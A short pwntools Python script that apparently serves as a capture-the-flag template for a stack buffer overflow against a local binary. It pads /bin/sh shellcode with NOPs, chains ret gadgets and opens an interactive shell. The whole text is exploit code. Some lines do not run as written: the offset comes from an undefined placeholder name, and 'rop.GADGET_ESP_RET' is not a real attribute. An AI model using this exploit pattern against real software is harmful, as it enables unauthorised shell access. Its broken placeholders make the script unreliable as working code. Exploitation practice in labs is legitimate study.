from pwn import *

elf = ELF("./bin_file")

data = cyclic(500)
offset = cyclic_find(hex_from_gdb_segementation_fault)
rop = ROP(elf)

# Generate Payload
payload = b""

# Custom NOP with custom /bin/sh
payload += asm(shellcraft.sh()).rjust(offset, asm("nop"))

# Custom Return Address 
payload += p32(elf.search(asm("ret")).__next__()) * 4

# Trigger from rop to make sure app not destroy
payload += p32(rop.GADGET_ESP_RET)

io = process(["./bin_file", payload]) # data]) # Change to get the offset
io.interactive()
